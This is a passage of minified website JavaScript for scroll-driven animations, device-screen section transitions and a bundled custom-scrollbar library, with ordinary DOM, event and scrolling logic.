Ae(0,r).getValueAsPercent(i),s=this.getEarlyScrollHeight_(),o=new Ae(0,r-s).getPercentAsValue(n),a=0,l=null,h=this.spacers_.find((t=>{let e=t.getElement().offsetHeight;return a+=e,l=new Ae(a-e,a),l.contains(o)}));if(h){let t=l.getValueAsPercent(o),i=h.getRange(this.durationInFrames_).getPercentAsValue(t),r=new Ae(0,this.durationInFrames_).getValueAsPercent(i);if(this.rafProgress.easeTo(r,Kp,Do.EASE.linear),h.isAutoplay()&&this.scroll_.isScrollingDown()&&i!==this.durationInFrames_&&e<=0){let t=this.scrollElement.scrollTop;this.autoplayTimeout_=setTimeout((()=>{this.rl_.mutate((()=>{this.scrollElement.scrollTop=t+h.getPxPerFrame()}))}),this.msPerFrame_)}}else this.rafProgress.easeTo(1,Kp,Do.EASE.linear)}getTotalSpacerHeight_(){return this.spacers_.reduce(((t,e)=>t+e.getElement().offsetHeight),0)}getEarlyScrollHeight_(){let t=this.getTotalSpacerHeight_();return this.shaft_.offsetHeight-t-this.elevator_.offsetHeight}scrollToFrame(t){let e=0,i=this.spacers_.find((i=>!!i.getRange(this.durationInFrames_).contains(t)||(e+=i.getElement().offsetHeight,!1))),r=this.spacers_.reduce(((t,e)=>t+e.getElement().offsetHeight),0),n=i.getRange(this.durationInFrames_).getValueAsPercent(t);e+=i.getElement().offsetHeight*n;let s=e/r,o=So(this.shaft_)-Sn(),a=this.shaft_.offsetHeight-this.elevator_.offsetHeight,l=new Ae(o,o+a).getPercentAsValue(s);window.scroll({top:l,left:0,behavior:"smooth"})}scrollLoop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.scrollLoop_())),(!this.isInIntroduction_||0!==this.scrollElement.scrollTop)&&(this.isInIntroduction_=!1,clearTimeout(this.autoplayTimeout_),this.updateProgress_())}))}frameLoop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.frameLoop_()));let t=de.getElapsedMilliseconds()/this.msPerFrame_;if(this.isInIntroduction_){let t=this.lottie_.currentFrame/this.durationInFrames_;this.rafProgress.easeTo(t,Kp,Do.EASE.linear)}this.lottie_.currentFrame>=this.introFrames_&&(this.isInIntroduction_=!1);let e=sr.fromElementOffset(this.lottieElement_);if((!this.lastElevatorDimensions_||!e.equals(this.lastElevatorDimensions_))&&(this.lastElevatorDimensions_=e,this.rl_.mutate((()=>this.lottie_.resize()))),!this.isInIntroduction_){let e=this.lottie_.currentFrame+t,i=this.targetFrame_-e,r=this.maxPlaybackSpeed_-1,n=e+Math.min(r*t,i),s=e<this.targetFrame_?Math.min(n,this.targetFrame_):this.targetFrame_;this.rl_.mutate((()=>this.lottie_.goToAndStop(s,!0)))}}))}dispose_(){this.mqnTemplateLottieElevatorService_.deregister(this.element_),this.domWatcher_&&this.domWatcher_.dispose(),this.scroll_.destroy(this),this.rl_.destroy()}};function FC(t,e){void 0===e&&(e=null);var i=zr(t,e),r=Io(e);return new Ae(1-t.offsetHeight,r-1).contains(i)?0:i>0?i-r:i+t.offsetHeight}var pN=Vc.getSingleton();function Fu(t){return pN.getVisibleDistanceFromRootIgnoringSticky(t)}function NC(t,e){return void 0===e&&(e=null),null!==e?Fu(t)-Fu(e):Fu(t)}function VC(t,e){void 0===e&&(e=null);var i=NC(t,e),r=Io(e),n=Ae.clamp(i,0,r);return Ae.clamp(i+t.offsetHeight,0,r)-n}function qC(t,e){return Zc(t,(function(t){var i=VC(t,e);return i>0?i:-Math.abs(FC(t,e))}))}function BC(t,e,i){void 0===i&&(i=Number.POSITIVE_INFINITY);for(var r=t,n=[];-1!==r.indexOf(e)&&n.length<i;){var s=r.indexOf(e),o=r.slice(0,s);r=r.slice(s+1),n.push(o)}return n.length<i&&n.push(r),n}var WC=300,mN=100,Nu={DEVICE:te.mqnCssName("mqn2-template-locked-screen__devices"),DEVICE_SHAFT:te.mqnCssName("mqn2-template-locked-screen__device-shaft"),DEVICE_PREVIOUS:te.mqnCssName("mqn2-template-locked-screen__devices--previous"),DEVICE_NEXT:te.mqnCssName("mqn2-template-locked-screen__devices--next"),IMAGES:te.mqnCssName("mqn2-template-locked-screen__images"),SCREEN:te.mqnCssName("mqn2-template-locked-screen__screen"),SECTION:te.mqnCssName("mqn2-template-locked-screen__section")},UC=class{constructor(t,e,i=WC){let r=(new Date).getTime(),n=i*Math.abs(e-t);this.timeRange_=new Ae(r,r+n),this.reverseOrder_=e<t,this.valueRange_=Ae.fromUnorderedValues(t,e)}getValueAtTime(t){let e=this.timeRange_.getValueAsPercent(t);return this.reverseOrder_?this.valueRange_.getPercentAsValue(1-e):this.valueRange_.getPercentAsValue(e)}isDoneAtTime(t){return t>=this.timeRange_.getMax()}dispose(){this.timeRange_=null,this.valueRange_=null}},HC=class{constructor(t,e){this.section_=t,this.index_=parseInt(this.section_.getAttribute("data-index"));let i=`[data-index="${this.index_}"]`;this.screen_=e.querySelector(`.${Nu.SCREEN}${i}`),this.device_=e.querySelector(`.${Nu.DEVICE}${i}`),this.deviceShaft_=this.device_.querySelector(`.${Nu.DEVICE_SHAFT}`),this.maintainsPreviousDevice_="TRUE"===this.device_.getAttribute("data-maintain-previous-device").toUpperCase(),this.transition_=null,this.rl_=de.getDestroyableInstance(),this.loop_()}maintainsPreviousDevice(){return this.maintainsPreviousDevice_}getDeviceShaftElement(){return this.deviceShaft_}getDeviceElement(){return this.device_}getSectionElement(){return this.section_}loop_(){this.rl_.mutate((()=>{if(this.rl_.cleanup((()=>this.loop_())),this.isTransitioning()){let t=(new Date).getTime(),e=this.transition_.getValueAtTime(t);Ie(this.screen_,"opacity",`${e}`),this.transition_.isDoneAtTime(t)&&this.stopTransition()}}))}transitionScreenTo(t,e=WC){let i=Ei(this.screen_,"opacity");i!==t?this.transition_=new UC(i,t,e):this.stopTransition()}snapTransitionScreenTo(t){this.transitionScreenTo(t,mN)}setScreenTo(t){this.stopTransition(),this.rl_.mutate((()=>Ie(this.screen_,"opacity",`${t}`)))}isTransitioning(){return null!==this.transition_}stopTransition(){this.isTransitioning()&&(this.transition_.dispose(),this.transition_=null)}dispose(){this.stopTransition(),this.rl_.destroy()}},GC=class{static get $inject(){return["$element","$scope"]}constructor(t,e){this.el_=t[0],this.rl_=de.getDestroyableInstance(),this.sections_=Array.from(this.el_.querySelectorAll(`.${Nu.SECTION}`)).map((t=>new HC(t,this.el_))),this.sectionsByElement_=new Map(this.sections_.map((t=>[t.getSectionElement(),t]))),this.lastTargetSection_=null,this.init_(),e.$on("$destroy",(()=>this.dispose_()))}init_(){this.setupDeviceShafts_(),this.loop_()}setupDeviceShafts_(){this.sections_.forEach(((t,e)=>{if(t.maintainsPreviousDevice())return;Ie(t.getDeviceShaftElement(),"--device-shaft-height-in-sections",`${xs(this.sections_.slice(e+1),((t,e)=>t.maintainsPreviousDevice())).length+1}`)}))}loop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.loop_()));let t=qC(this.getSectionElements_()),e=this.sectionsByElement_.get(t),[i,[r,...n]]=BC(this.sections_,this.sectionsByElement_.get(t));e.isTransitioning()||i.forEach((t=>t.setScreenTo(1))),this.lastTargetSection_!==e&&(e.transitionScreenTo(1),r&&(r.transitionScreenTo(0),n.forEach((t=>t.snapTransitionScreenTo(0))))),this.lastTargetSection_=e}))}getSectionElements_(){return this.sectionsByElement_.keys()}dispose_(){this.sections_.forEach((t=>t.dispose())),this.rl_.destroy()}},zC=GC,rT=ye(en());function un(t){return getComputedStyle(t)}function Qr(t,e){for(var i in e){var r=e[i];"number"==typeof r&&(r+="px"),t.style[i]=r}return t}function Vu(t){var e=document.createElement("div");return e.className=t,e}var jC="undefined"!=typeof Element&&(Element.prototype.matches||Element.prototype.webkitMatchesSelector||Element.prototype.mozMatchesSelector||Element.prototype.msMatchesSelector);function Jn(t,e){if(!jC)throw new Error("No element matching method supported");return jC.call(t,e)}function ko(t){t.remove?t.remove():t.parentNode&&t.parentNode.removeChild(t)}function YC(t,e){return Array.prototype.filter.call(t.children,(function(t){return Jn(t,e)}))}var br={main:"ps",element:{thumb:function(t){return"ps__thumb-"+t},rail:function(t){return"ps__rail-"+t},consuming:"ps__child--consume"},state:{focus:"ps--focus",clicking:"ps--clicking",active:function(t){return"ps--active-"+t},scrolling:function(t){return"ps--scrolling-"+t}}},XC={x:null,y:null};function QC(t,e){var i=t.element.classList,r=br.state.scrolling(e);i.contains(r)?clearTimeout(XC[e]):i.add(r)}function KC(t,e){XC[e]=setTimeout((function(){return t.isAlive&&t.element.classList.remove(br.state.scrolling(e))}),t.settings.scrollingThreshold)}function gN(t,e){QC(t,e),KC(t,e)}var nl=function(t){this.element=t,this.handlers={}},ZC={isEmpty:{configurable:!0}};nl.prototype.bind=function(t,e){void 0===this.handlers[t]&&(this.handlers[t]=[]),this.handlers[t].push(e),this.element.addEventListener(t,e,!1)},nl.prototype.unbind=function(t,e){var i=this;this.handlers[t]=this.handlers[t].filter((function(r){return!(!e||r===e)||(i.element.removeEventListener(t,r,!1),!1)}))},nl.prototype.unbindAll=function(){for(var t in this.handlers)this.unbind(t)},ZC.isEmpty.get=function(){var t=this;return Object.keys(this.handlers).every((function(e){return 0===t.handlers[e].length}))},Object.defineProperties(nl.prototype,ZC);var Fo=function(){this.eventElements=[]};function qu(t){if("function"==typeof window.CustomEvent)return new CustomEvent(t);var e=document.createEvent("CustomEvent");return e.initCustomEvent(t,!1,!1,void 0),e}Fo.prototype.eventElement=function(t){var e=this.eventElements.filter((function(e){return e.element===t}))[0];return e||(e=new nl(t),this.eventElements.push(e)),e},Fo.prototype.bind=function(t,e,i){this.eventElement(t).bind(e,i)},Fo.prototype.unbind=function(t,e,i){var r=this.eventElement(t);r.unbind(e,i),r.isEmpty&&this.eventElements.splice(this.eventElements.indexOf(r),1)},Fo.prototype.unbindAll=function(){this.eventElements.forEach((function(t){return t.unbindAll()})),this.eventElements=[]},Fo.prototype.once=function(t,e,i){var r=this.eventElement(t),n=function(t){r.unbind(e,n),i(t)};r.bind(e,n)};var Bu=function(t,e,i,r,n){var s;if(void 0===r&&(r=!0),void 0===n&&(n=!1),"top"===e)s=["contentHeight","containerHeight","scrollTop","y","up","down"];else{if("left"!==e)throw new Error("A proper axis should be provided");s=["contentWidth","containerWidth","scrollLeft","x","left","right"]}vN(t,i,s,r,n)};function vN(t,e,i,r,n){var s=i[0],o=i[1],a=i[2],l=i[3],h=i[4],c=i[5];void 0===r&&(r=!0),void 0===n&&(n=!1);var u=t.element;t.reach[l]=null,u[a]<1&&(t.reach[l]="start"),u[a]>t[s]-t[o]-1&&(t.reach[l]="end"),e&&(u.dispatchEvent(qu("ps-scroll-"+l)),e<0?u.dispatchEvent(qu("ps-scroll-"+h)):e>0&&u.dispatchEvent(qu("ps-scroll-"+c)),r&&gN(t,l)),t.reach[l]&&(e||n)&&u.dispatchEvent(qu("ps-"+l+"-reach-"+t.reach[l]))}function tr(t){return parseInt(t,10)||0}function yN(t){return Jn(t,"input,[contenteditable]")||Jn(t,"select,[contenteditable]")||Jn(t,"textarea,[contenteditable]")||Jn(t,"button,[contenteditable]")}function _N(t){var e=un(t);return tr(e.width)+tr(e.paddingLeft)+tr(e.paddingRight)+tr(e.borderLeftWidth)+tr(e.borderRightWidth)}var No={isWebKit:"undefined"!=typeof document&&"WebkitAppearance"in document.documentElement.style,supportsTouch:"undefined"!=typeof window&&("ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch),supportsIePointer:"undefined"!=typeof navigator&&navigator.msMaxTouchPoints,isChrome:"undefined"!=typeof navigator&&/Chrome/i.test(navigator&&navigator.userAgent)},In=function(t){var e=t.element;if(!e)return;var i=Math.floor(e.scrollTop);t.containerWidth=e.clientWidth,t.containerHeight=e.clientHeight,t.contentWidth=e.scrollWidth,t.contentHeight=e.scrollHeight,e.contains(t.scrollbarXRail)||(YC(e,br.element.rail("x")).forEach((function(t){return ko(t)})),e.appendChild(t.scrollbarXRail)),e.contains(t.scrollbarYRail)||(YC(e,br.element.rail("y")).forEach((function(t){return ko(t)})),e.appendChild(t.scrollbarYRail));let r=t.settings.xMargin||0;!t.settings.suppressScrollX&&t.containerWidth+t.settings.scrollXMarginOffset<t.contentWidth?(t.scrollbarXActive=!0,t.railXWidth=t.containerWidth-t.railXMarginWidth-r,t.railXRatio=t.containerWidth/t.railXWidth,t.scrollbarXWidth=JC(t,tr(t.railXWidth*t.containerWidth/t.contentWidth)),t.scrollbarXLeft=tr((t.negativeScrollAdjustment+e.scrollLeft)*(t.railXWidth-t.scrollbarXWidth)/(t.contentWidth-t.containerWidth))):t.scrollbarXActive=!1,!t.settings.suppressScrollY&&t.containerHeight+t.settings.scrollYMarginOffset<t.contentHeight?(t.scrollbarYActive=!0,t.railYHeight=t.containerHeight-t.railYMarginHeight,t.railYRatio=t.containerHeight/t.railYHeight,t.scrollbarYHeight=JC(t,tr(t.railYHeight*t.containerHeight/t.contentHeight)),t.scrollbarYTop=tr(i*(t.railYHeight-t.scrollbarYHeight)/(t.contentHeight-t.containerHeight))):t.scrollbarYActive=!1,t.scrollbarXLeft>=t.railXWidth-t.scrollbarXWidth&&(t.scrollbarXLeft=t.railXWidth-t.scrollbarXWidth),t.scrollbarYTop>=t.railYHeight-t.scrollbarYHeight&&(t.scrollbarYTop=t.railYHeight-t.scrollbarYHeight),bN(e,t),t.scrollbarXActive?e.classList.add(br.state.active("x")):(e.classList.remove(br.state.active("x")),t.scrollbarXWidth=0,t.scrollbarXLeft=0,e.scrollLeft=0),t.scrollbarYActive?e.classList.add(br.state.active("y")):(e.classList.remove(br.state.active("y")),t.scrollbarYHeight=0,t.scrollbarYTop=0,e.scrollTop=0)};function JC(t,e){return t.settings.minScrollbarLength&&(e=Math.max(e,t.settings.minScrollbarLength)),t.settings.maxScrollbarLength&&(e=Math.min(e,t.settings.maxScrollbarLength)),e}function bN(t,e){var i={width:e.railXWidth},r=Math.floor(t.scrollTop);e.isRtl?i.left=e.negativeScrollAdjustment+t.scrollLeft+e.containerWidth-e.contentWidth:i.left=t.scrollLeft,e.isScrollbarXUsingBottom?i.bottom=e.scrollbarXBottom-r:i.top=e.scrollbarXTop+r,Qr(e.scrollbarXRail,i);var n={top:r,height:e.railYHeight};e.isScrollbarYUsingRight?e.isRtl?n.right=e.contentWidth-(e.negativeScrollAdjustment+t.scrollLeft)-e.scrollbarYRight-e.scrollbarYOuterWidth:n.right=e.scrollbarYRight-t.scrollLeft:e.isRtl?n.left=e.negativeScrollAdjustment+t.scrollLeft+2*e.containerWidth-e.contentWidth-e.scrollbarYLeft-e.scrollbarYOuterWidth:n.left=e.scrollbarYLeft+t.scrollLeft,Qr(e.scrollbarYRail,n),Qr(e.scrollbarX,{left:e.scrollbarXLeft,width:e.scrollbarXWidth-e.railBorderXWidth}),Qr(e.scrollbarY,{top:e.scrollbarYTop,height:e.scrollbarYHeight-e.railBorderYWidth})}var wN=function(t){t.event.bind(t.scrollbarY,"mousedown",(function(t){return t.stopPropagation()})),t.event.bind(t.scrollbarYRail,"mousedown",(function(e){var i=e.pageY-window.pageYOffset-t.scrollbarYRail.getBoundingClientRect().top>t.scrollbarYTop?1:-1;t.element.scrollTop+=i*t.containerHeight,In(t),e.stopPropagation()})),t.event.bind(t.scrollbarX,"mousedown",(function(t){return t.stopPropagation()})),t.event.bind(t.scrollbarXRail,"mousedown",(function(e){e.pageX,window.pageXOffset,t.scrollbarXRail.getBoundingClientRect().left,t.scrollbarXLeft;var i=t.element.scrollLeft,r=t.scrollbarXRail.getBoundingClientRect().width,n=e.pageX/r;t.scrollbarX.getBoundingClientRect().width,i=(t.element.scrollWidth-window.innerWidth)*n;t.element.dispatchEvent(new CustomEvent("ps-update-position",{detail:{x:i,type:"railClick"}})),In(t),e.stopPropagation()}))},EN=function(t){eT(t,["containerWidth","contentWidth","pageX","railXWidth","scrollbarX","scrollbarXWidth","scrollLeft","x","scrollbarXRail"]),eT(t,["containerHeight","contentHeight","pageY","railYHeight","scrollbarY","scrollbarYHeight","scrollTop","y","scrollbarYRail"])};function eT(t,e){var i=e[0],r=e[1],n=e[2],s=e[3],o=e[4],a=e[5],l=e[6],h=e[7],c=e[8],u=t.element,d=null,p=null,m=null;function f(e){let i=d+m*(e[n]-p);t.element.dispatchEvent(new CustomEvent("ps-update-position",{detail:{x:i,type:"mousemove"}})),QC(t,h),In(t),e.stopPropagation(),e.cancelable&&e.preventDefault()}function g(){KC(t,h),t[c].classList.remove(br.state.clicking),t.event.unbind(t.ownerDocument,"mousemove",f)}t.event.bind(t[o],"mousedown",(function(e){d=u[l],p=e[n],m=(t[r]-t[i])/(t[s]-t[a]),t.event.bind(t.ownerDocument,"mousemove",f),t.event.once(t.ownerDocument,"mouseup",g),t[c].classList.add(br.state.clicking),e.stopPropagation(),e.cancelable&&e.preventDefault()}))}var SN=function(t){var e=t.element;t.event.bind(t.ownerDocument,"keydown",(function(i){if(!(i.isDefaultPrevented&&i.isDefaultPrevented()||i.defaultPrevented)&&(Jn(e,":hover")||Jn(t.scrollbarX,":focus")||Jn(t.scrollbarY,":focus"))){var r=document.activeElement?document.activeElement:t.ownerDocument.activeElement;if(r){if("IFRAME"===r.tagName)r=r.contentDocument.activeElement;else for(;r.shadowRoot;)r=r.shadowRoot.activeElement;if(yN(r))return}var n=0,s=0;switch(i.which){case 37:n=i.metaKey?-t.contentWidth:i.altKey?-t.containerWidth:-30;break;case 38:s=i.metaKey?t.contentHeight:i.altKey?t.containerHeight:30;break;case 39:n=i.metaKey?t.contentWidth:i.altKey?t.containerWidth:30;break;case 40:s=i.metaKey?-t.contentHeight:i.altKey?-t.containerHeight:-30;break;case 32:s=i.shiftKey?t.containerHeight:-t.containerHeight;break;case 33:s=t.containerHeight;break;case 34:s=-t.containerHeight;break;case 36:s=t.contentHeight;break;case 35:s=-t.contentHeight;break;default:return}t.settings.suppressScrollX&&0!==n||t.settings.suppressScrollY&&0!==s||(e.scrollTop-=s,t.element.dispatchEvent(new CustomEvent("ps-update-position",{detail:{x:e.scrollLeft+n,type:"keyboard"}})),In(t),function(i,r){var n=Math.floor(e.scrollTop);if(0===i){if(!t.scrollbarYActive)return!1;if(0===n&&r>0||n>=t.contentHeight-t.containerHeight&&r<0)return!t.settings.wheelPropagation}var s=e.scrollLeft;if(0===r){if(!t.scrollbarXActive)return!1;if(0===s&&i<0||s>=t.contentWidth-t.containerWidth&&i>0)return!t.settings.wheelPropagation}return!0}(n,s)&&i.cancelable&&i.preventDefault())}}))},AN=function(t){var e=t.element;function i(i){var r=function(t){var e=t.deltaX,i=-1*t.deltaY;return(void 0===e||void 0===i)&&(e=-1*t.wheelDeltaX/6,i=t.wheelDeltaY/6),t.deltaMode&&1===t.deltaMode&&(e*=10,i*=10),e!=e&&i!=i&&(e=0,i=t.wheelDelta),t.shiftKey?[-i,-e]:[e,i]}(i),n=r[0],s=r[1];if(!function(t,i,r){if(!No.isWebKit&&e.querySelector("select:focus"))return!0;if(!e.contains(t))return!1;for(var n=t;n&&n!==e;){if(n.classList.contains(br.element.consuming))return!0;var s=un(n);if([s.overflow,s.overflowX,s.overflowY].join("").match(/(scroll|auto)/)){var o=n.scrollHeight-n.clientHeight;if(o>0&&!(0===n.scrollTop&&r>0)&&!(n.scrollTop===o&&r<0))return!0;var a=n.scrollWidth-n.clientWidth;if(a>0&&!(0===n.scrollLeft&&i<0)&&!(n.scrollLeft===a&&i>0))return!0}n=n.parentNode}return!1}(i.target,n,s)){var o=!1;if(t.settings.useBothWheelAxes)t.scrollbarYActive&&!t.scrollbarXActive?(s?e.scrollTop-=s*t.settings.wheelSpeed:e.scrollTop+=n*t.settings.wheelSpeed,o=!0):t.scrollbarXActive&&!t.scrollbarYActive&&(n?e.scrollLeft+=n*t.settings.wheelSpeed:e.scrollLeft-=s*t.settings.wheelSpeed,o=!0);else{e.scrollTop-=s*t.settings.wheelSpeed;let i=e.scrollLeft+n*t.settings.wheelSpeed;t.element.dispatchEvent(new CustomEvent("ps-update-position",{detail:{x:i,type:"mousewheel"}}))}In(t),(o=o||function(i,r){var n=Math.floor(e.scrollTop),s=0===e.scrollTop,o=n+e.offsetHeight===e.scrollHeight,a=0===e.scrollLeft,l=e.scrollLeft+e.offsetWidth===e.scrollWidth;return!(Math.abs(r)>Math.abs(i)?s||o:a||l)||!t.settings.wheelPropagation}(n,s))&&!i.ctrlKey&&(i.stopPropagation(),i.cancelable&&i.preventDefault())}}void 0!==window.onwheel?t.event.bind(e,"wheel",i):void 0!==window.onmousewheel&&t.event.bind(e,"mousewheel",i)},CN=function(t){if(No.supportsTouch||No.supportsIePointer){var e=t.element,i={},r=0,n={},s=null;No.supportsTouch?(t.event.bind(e,"touchstart",h),t.event.bind(e,"touchmove",c),t.event.bind(e,"touchend",u)):No.supportsIePointer&&(window.PointerEvent?(t.event.bind(e,"pointerdown",h),t.event.bind(e,"pointermove",c),t.event.bind(e,"pointerup",u)):window.MSPointerEvent&&(t.event.bind(e,"MSPointerDown",h),t.event.bind(e,"MSPointerMove",c),t.event.bind(e,"MSPointerUp",u)))}function o(i,r){e.scrollTop-=r;let n=e.scrollLeft-i;t.element.dispatchEvent(new CustomEvent("ps-update-position",{detail:{x:n,type:"touch"}})),In(t)}function a(t){return t.targetTouches?t.targetTouches[0]:t}function l(t){return(!t.pointerType||"pen"!==t.pointerType||0!==t.buttons)&&!!(t.targetTouches&&1===t.targetTouches.length||t.pointerType&&"mouse"!==t.pointerType&&t.pointerType!==t.MSPOINTER_TYPE_MOUSE)}function h(t){if(l(t)){var e=a(t);i.pageX=e.pageX,i.pageY=e.pageY,r=(new Date).getTime(),null!==s&&clearInterval(s)}}function c(s){if(l(s)){var h=a(s),c={pageX:h.pageX,pageY:h.pageY},u=c.pageX-i.pageX,d=c.pageY-i.pageY;if(function(t,i,r){if(!e.contains(t))return!1;for(var n=t;n&&n!==e;){if(n.classList.contains(br.element.consuming))return!0;var s=un(n);if([s.overflow,s.overflowX,s.overflowY].join("").match(/(scroll|auto)/)){var o=n.scrollHeight-n.clientHeight;if(o>0&&!(0===n.scrollTop&&r>0)&&!(n.scrollTop===o&&r<0))return!0;var a=n.scrollLeft-n.clientWidth;if(a>0&&!(0===n.scrollLeft&&i<0)&&!(n.scrollLeft===a&&i>0))return!0}n=n.parentNode}return!1}(s.target,u,d))return;o(u,d),i=c;var p=(new Date).getTime(),m=p-r;m>0&&(n.x=u/m,n.y=d/m,r=p),function(i,r){var n=Math.floor(e.scrollTop),s=e.scrollLeft,o=Math.abs(i),a=Math.abs(r);if(a>o){if(r<0&&n===t.contentHeight-t.containerHeight||r>0&&0===n)return 0===window.scrollY&&r>0&&No.isChrome}else if(o>a&&(i<0&&s===t.contentWidth-t.containerWidth||i>0&&0===s))return!0;return!0}(u,d)&&s.cancelable&&s.preventDefault()}}function u(){t.settings.swipeEasing&&(clearInterval(s),s=setInterval((function(){t.isInitialized?clearInterval(s):n.x||n.y?Math.abs(n.x)<.01&&Math.abs(n.y)<.01?clearInterval(s):(o(30*n.x,30*n.y),n.x*=.8,n.y*=.8):clearInterval(s)}),10))}},TN=function(){return{handlers:["click-rail","drag-thumb","keyboard","wheel","touch"],maxScrollbarLength:null,minScrollbarLength:null,scrollingThreshold:1e3,scrollXMarginOffset:0,scrollYMarginOffset:0,suppressScrollX:!1,suppressScrollY:!1,swipeEasing:!0,useBothWheelAxes:!1,wheelPropagation:!0,wheelSpeed:1,xMargin:0}},xN={"click-rail":wN,"drag-thumb":EN,keyboard:SN,wheel:AN,touch:CN},sl=function(t,e){var i=this;if(void 0===e&&(e={}),"string"==typeof t&&(t=document.querySelector(t)),!t||!t.nodeName)throw new Error("no element is specified to initialize PerfectScrollbar");for(var r in this.element=t,t.classList.add(br.main),this.settings=TN(),e)i.settings[r]=e[r];this.containerWidth=null,this.containerHeight=null,this.contentWidth=null,this.contentHeight=null;var n,s,o=function(){return t.classList.add(br.state.focus)},a=function(){return t.classList.remove(br.state.focus)};this.isRtl="rtl"===un(t).direction,this.isNegativeScroll=(s=t.scrollLeft,t.scrollLeft=-1,n=t.scrollLeft<0,t.scrollLeft=s,n),this.negativeScrollAdjustment=this.isNegativeScroll?t.scrollWidth-t.clientWidth:0,this.event=new Fo,this.ownerDocument=t.ownerDocument||document,this.scrollbarXRail=Vu(br.element.rail("x")),t.appendChild(this.scrollbarXRail),this.scrollbarX=Vu(br.element.thumb("x")),this.scrollbarXRail.appendChild(this.scrollbarX),this.scrollbarX.setAttribute("tabindex",0),this.event.bind(this.scrollbarX,"focus",o),this.event.bind(this.scrollbarX,"blur",a),this.scrollbarXActive=null,this.scrollbarXWidth=null,this.scrollbarXLeft=null;var l=un(this.scrollbarXRail);this.scrollbarXBottom=parseInt(l.bottom,10),isNaN(this.scrollbarXBottom)?(this.isScrollbarXUsingBottom=!1,this.scrollbarXTop=tr(l.top)):this.isScrollbarXUsingBottom=!0,this.railBorderXWidth=tr(l.borderLeftWidth)+tr(l.borderRightWidth),Qr(this.scrollbarXRail,{display:"block"}),this.railXMarginWidth=tr(l.marginLeft)+tr(l.marginRight),Qr(this.scrollbarXRail,{display:""}),this.railXWidth=null,this.railXRatio=null,this.scrollbarYRail=Vu(br.element.rail("y")),t.appendChild(this.scrollbarYRail),this.scrollbarY=Vu(br.element.thumb("y")),this.scrollbarYRail.appendChild(this.scrollbarY),this.scrollbarY.setAttribute("tabindex",0),this.event.bind(this.scrollbarY,"focus",o),this.event.bind(this.scrollbarY,"blur",a),this.scrollbarYActive=null,this.scrollbarYHeight=null,this.scrollbarYTop=null;var h=un(this.scrollbarYRail);this.scrollbarYRight=parseInt(h.right,10),isNaN(this.scrollbarYRight)?(this.isScrollbarYUsingRight=!1,this.scrollbarYLeft=tr(h.left)):this.isScrollbarYUsingRight=!0,this.scrollbarYOuterWidth=this.isRtl?_N(this.scrollbarY):null,this.railBorderYWidth=tr(h.borderTopWidth)+tr(h.borderBottomWidth),Qr(this.scrollbarYRail,{display:"block"}),this.railYMarginHeight=tr(h.marginTop)+tr(h.marginBottom),Qr(this.scrollbarYRail,{display:""}),this.railYHeight=null,this.railYRatio=null,this.reach={x:t.scrollLeft<=0?"start":t.scrollLeft>=this.contentWidth-this.containerWidth?"end":null,y:t.scrollTop<=0?"start":t.scrollTop>=this.contentHeight-this.containerHeight?"end":null},this.isAlive=!0,this.settings.handlers.forEach((function(t){return xN[t](i)})),this.lastScrollTop=Math.floor(t.scrollTop),this.lastScrollLeft=t.scrollLeft,this.event.bind(this.element,"scroll",(function(t){return i.onScroll(t)})),In(this)};sl.prototype.update=function(){!this.isAlive||(this.negativeScrollAdjustment=this.isNegativeScroll?this.element.scrollWidth-this.element.clientWidth:0,Qr(this.scrollbarXRail,{display:"block"}),Qr(this.scrollbarYRail,{display:"block"}),this.railXMarginWidth=tr(un(this.scrollbarXRail).marginLeft)+tr(un(this.scrollbarXRail).marginRight),this.railYMarginHeight=tr(un(this.scrollbarYRail).marginTop)+tr(un(this.scrollbarYRail).marginBottom),Qr(this.scrollbarXRail,{display:"none"}),Qr(this.scrollbarYRail,{display:"none"}),In(this),Bu(this,"top",0,!1,!0),Bu(this,"left",0,!1,!0),Qr(this.scrollbarXRail,{display:""}),Qr(this.scrollbarYRail,{display:""}))},sl.prototype.onScroll=function(t){!this.isAlive||(In(this),Bu(this,"top",this.element.scrollTop-this.lastScrollTop),Bu(this,"left",this.element.scrollLeft-this.lastScrollLeft),this.lastScrollTop=Math.floor(this.element.scrollTop),this.lastScrollLeft=this.element.scrollLeft)},sl.prototype.destroy=function(){!this.isAlive||(this.event.unbindAll(),ko(this.scrollbarX),ko(this.scrollbarY),ko(this.scrollbarXRail),ko(this.scrollbarYRail),this.removePsClasses(),this.element=null,this.scrollbarX=null,this.scrollbarY=null,this.scrollbarXRail=null,this.scrollbarYRail=null,this.isAlive=!1)},sl.prototype.removePsClasses=function(){this.element.className=this.element.className.split(" ").filter((function(t){return!t.match(/^ps([-_].+|)$/)})).join(" ")};var tT=sl,Wu=ye(gt()),iT=ye(Jt()),nT=class{static get $inject(){return["$rootScope","$element","$scope"]}constructor(t,e,i){this.el=e[0],this.$element=e,this.perfectScrollbar=null,this.scrollEl=this.el.querySelector("div[mqn-scroller]"),this.mousePos={x:0,down:!1,start:0},this.windowResizeListener=null,this.raf=new Wu.Raf(this.onRaf.bind(this)),this.originalLerpSpeed=.12,this.lerpSpeed=this.originalLerpSpeed,this.options=null,this.targetX=0,this.mouseMoveListener=null,this.mouseUpListener=null,this.mouseDownListener=null,this.mouseOutListener=null,window.setTimeout((()=>{this.setUpMouseDrag_()}));let r=t=>{this.createScrollbar(),this.perfectScrollbar&&this.perfectScrollbar.update(),this.lerp=!this.isMobile()&&this.options.lerp};window.MQN_RESIZER?(window.MQN_RESIZER.addListener(r),this.windowResizeListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(r)}):($window.addEventListener("resize",r,{passive:!0}),this.windowResizeListener=()=>{$window.removeEventListener("resize",r)})}init(t){this.mobileOnly=t.mobileOnly,this.lerp=!this.isMobile()&&t.lerp,this.options=t,this.ev=iT.elementVisibility.inview(this.el,{},((t,e)=>{this.lerp&&(e.isIntersecting&&!this.isMobile()?this.raf.start():this.raf.stop())})),this.createScrollbar()}onRaf(){let t=this.scrollEl.scrollLeft;this.scrollEl.scrollLeft=Wu.mathf.lerp(t,this.targetX,this.lerpSpeed),this.perfectScrollbar.update();this.targetX}setUpMouseDrag_(){this.mouseMoveListener=null;let t=t=>{if(window.innerWidth<rt.TABLET)return;let e=Math.abs(this.mousePos.x-this.mousePos.start);if(this.mousePos.down){let 